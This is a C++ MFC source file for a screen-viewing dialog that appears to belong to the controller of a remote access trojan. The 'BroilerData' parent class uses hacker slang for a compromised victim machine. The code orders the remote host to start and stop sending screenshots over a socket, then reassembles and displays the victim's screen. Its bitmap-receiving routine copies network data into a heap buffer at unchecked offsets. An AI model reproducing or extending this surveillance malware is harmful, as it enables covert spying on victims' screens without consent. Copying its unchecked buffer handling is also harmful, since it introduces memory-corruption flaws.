// ScreenDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Client.h"
#include "ScreenDlg.h"
#include "BroilerData.h"

// CScreenDlg 对话框

IMPLEMENT_DYNAMIC(CScreenDlg, CDialog)

CScreenDlg::CScreenDlg(CWnd* pParent /*=NULL*/,  SOCKET sock)
	: CDialog(CScreenDlg::IDD, pParent)
{
	m_socket = sock;
}

CScreenDlg::~CScreenDlg()
{
}

void CScreenDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenDlg, CDialog)
	ON_WM_VSCROLL()
	ON_WM_HSCROLL()
END_MESSAGE_MAP()


// CScreenDlg 消息处理程序
BOOL CScreenDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //如果按下的是回车键或ESC键，则截断消息
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}

BOOL CScreenDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}

void CScreenDlg::DlgInit()
{
	char strMsg[] = "open";  //开启线程
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_SCREEN;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
}

void CScreenDlg::GetScreenDataInfo(BMPDATA_C tagBmpData) //显示图像
{
	switch(tagBmpData.Id)
	{
	case 0:   //位图头信息
		{
			m_pBMPINFO = (BITMAPINFO*)LocalAlloc(LPTR,tagBmpData.HeadSize);
			memcpy(m_pBMPINFO,&tagBmpData.bmpinfo,tagBmpData.HeadSize);
			m_pData = new BYTE[tagBmpData.Size];
			memset(m_pData,0,tagBmpData.Size);
		}
		break;
	case 1:  //位图数据
		{
			//复制数据
			for(int i=tagBmpData.Begin,j=0;j < SCREEN_BUF_SIZE; i++, j++)
			{
				m_pData[i] = tagBmpData.Data[j];
			}
		}
		break;
	case 2:  //最后一次复制数据
 		{
			for(int i=tagBmpData.Begin,j=0;i<tagBmpData.Size;i++,j++)
			{
				m_pData[i] = tagBmpData.Data[j];
			}
		}
		break;
	default:
		{
			MessageBox(_T("未知的图像数据ID"),_T("提示"),MB_OK);
			delete[] m_pData;
			LocalFree(m_pBMPINFO);
			return;
		}
	}
	//判断传送完以后是否可以显示图像
	if(tagBmpData.bShow)
	{
		SCROLLINFO hStructure,vStructure;
		memset(&hStructure,0,sizeof(SCROLLINFO));
		memset(&vStructure,0,sizeof(SCROLLINFO));
		hStructure.cbSize = sizeof(SCROLLINFO);
		vStructure.cbSize = sizeof(SCROLLINFO);
		//获取滚动条的位置，根据位置绘制图像
		GetScrollInfo(SB_HORZ, &hStructure);
		GetScrollInfo(SB_VERT, &vStructure);

		CRect rc1;
		GetClientRect(&rc1);
		//显示图像
		::StretchDIBits(GetDC()->m_hDC,    
			0,
			31,
			m_pBMPINFO->bmiHeader.biWidth,
			m_pBMPINFO->bmiHeader.biHeight,
			hStructure.nPos,
			-vStructure.nPos,
			m_pBMPINFO->bmiHeader.biWidth,
			m_pBMPINFO->bmiHeader.biHeight,
			m_pData, //位图数据
			m_pBMPINFO, //BITMAPINFO 位图信息头
			DIB_RGB_COLORS,
			SRCCOPY
			);

		hStructure.fMask		= SIF_ALL;
		hStructure.nMin			= 0;
		//hStructure.nMax			= bitmap.bmWidth;
		hStructure.nMax			= m_pBMPINFO->bmiHeader.biWidth;
		hStructure.nPage		= rc1.right;
		SetScrollInfo(SB_HORZ, &hStructure);  //设置滚动条

		vStructure.fMask		= SIF_ALL;
		vStructure.nMin			= 0;
		//vStructure.nMax			= bitmap.bmHeight + 31;
		vStructure.nMax			= m_pBMPINFO->bmiHeader.biHeight + 31;
		vStructure.nPage		= rc1.bottom;
		SetScrollInfo(SB_VERT, &vStructure);

		delete []m_pData;
		LocalFree(m_pBMPINFO);
		m_pData = NULL;
		m_pBMPINFO = NULL;
	}
	return;
}

void CScreenDlg::PostNcDestroy()
{
	// TODO: 在此添加专用代码和/或调用基类
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pScreenDlg = NULL;
}

void CScreenDlg::OnCancel()
{
	// TODO: 在此添加专用代码和/或调用基类
	char strMsg[] = "quit";   //退出线程
	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_SCREEN;
	memcpy((char*)tagMsgInfo.context, (char*)strMsg, sizeof(strMsg));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);  //发送退出信息
	Sleep(30);
	DestroyWindow();
	delete this;
}

void CScreenDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (nSBCode != SB_ENDSCROLL)
	{
		SCROLLINFO hStructure;
		GetScrollInfo(SB_VERT, &hStructure);
		hStructure.nPos = nPos;
		SetScrollInfo(SB_VERT, &hStructure);
	}
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}

void CScreenDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
    if (nSBCode != SB_ENDSCROLL)
	{
		SCROLLINFO hStructure;
		GetScrollInfo(SB_HORZ, &hStructure);
		hStructure.nPos = nPos;
		SetScrollInfo(SB_HORZ, &hStructure);
	}
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}

